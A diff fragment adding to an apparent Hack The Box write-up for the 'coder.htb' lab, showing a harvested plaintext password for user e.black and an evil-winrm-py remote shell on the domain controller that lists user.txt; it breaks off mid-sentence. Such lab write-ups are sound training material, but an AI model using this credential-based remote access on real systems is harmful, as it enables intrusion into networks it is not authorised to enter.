@@ -877,5 +877,29 @@ WINRM       10.129.229.190  5985   DC01             [+] coder.htb\e.black:ypOSJX
 
 This user also has access over winrm!
 
+```python
+❯❯❯ python3 venv/bin/evil-winrm-py -i dc01.coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'                         
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
+[*] Connecting to 'dc01.coder.htb:5985' as 'e.black'
+evil-winrm-py PS C:\Users\e.black\Documents> cd ../Desktop
+evil-winrm-py PS C:\Users\e.black\Desktop> dir
+
+
+    Directory: C:\Users\e.black\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---       11/18/2026   4:33 PM             34 user.txt                                                               
+
+
+evil-winrm-py PS C:\Users\e.black\Desktop>
+```
+
+And now its at this point whe
 
